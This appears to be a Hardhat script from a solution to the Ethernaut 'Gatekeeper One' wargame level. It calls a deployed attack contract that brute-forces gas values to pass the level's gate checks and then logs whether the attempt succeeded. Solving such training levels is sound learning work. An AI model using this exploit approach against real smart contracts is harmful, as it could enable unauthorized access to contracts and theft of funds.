import { ethers } from "hardhat";

async function attackGateKeeperOne() {
    // change contract addresses here. change gas only if needed.
    const _gateAddress = "0x5a2C7Bb67C57AD2b89731D97d0a1bc1D6Cc7c1A0";
    const _gasLowerLimit = 50;
    const _gasUpperLimit = 300;
    const contractAddress = "0x43C32dB8181f4CD99CC5163a126002A351Ec1F71";
    // don't touch below
    const attack = await ethers.getContractAt("AttackGateKeeperOne", contractAddress);
    const tx = await attack.enterGate(_gateAddress, _gasLowerLimit, _gasUpperLimit);
    const txReceipt = await tx.wait(1);
    const event1 = await txReceipt.events[0].args.succeeded.toString();
    const event2 = await txReceipt.events[0].args.gasUsed.toString();
    console.log(`You passed this(Gatekeeper One) level: ${event1}`);
    console.log(`Gas used: ${event2}`);
}

attackGateKeeperOne()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
